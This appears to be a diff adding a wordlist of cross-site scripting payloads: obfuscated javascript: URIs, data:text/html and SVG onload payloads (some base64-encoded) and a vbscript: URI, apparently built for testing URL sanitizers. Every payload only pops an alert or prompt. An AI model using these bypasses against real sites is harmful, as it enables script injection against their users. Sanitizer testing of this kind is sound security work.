@@ -1,0 +1,31 @@
+javascript:alert(1)
+javascript://alert(1)
+javascript:/*--*///
+alert(1)
+javascript:alert?.(1)
+javascript:(alert)(1)
+javascript:window['alert'](1)
+javaSCRIPT:alert(1)
+JAVASCRIPT:alert(1)
+Javascript:alert(1)
+javascript:void(alert(1))
+javascript:confirm(1)
+javascript:prompt(1)
+javascript:eval('alert(1)')
+javascript:Function('alert(1)')()
+javascript:setTimeout('alert(1)',0)
+javascript:%61%6c%65%72%74(1)
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+data:text/html;charset=utf-8,<svg onload=alert(1)>
+data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
+data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIG9ubG9hZD0iYWxlcnQoMSkiLz4=
+javascript:/*%00*/alert(1)
+javascript:0?0:alert(1)
+javascript:1,alert(1)
+javascript:name?alert(1):0
+javascript:[1].map(alert)
+javascript:[1].forEach(alert)
+javascript:Promise.resolve(1).then(alert)
+javascript:Reflect.apply(alert,null,[1])
+vbscript:msgbox(1)
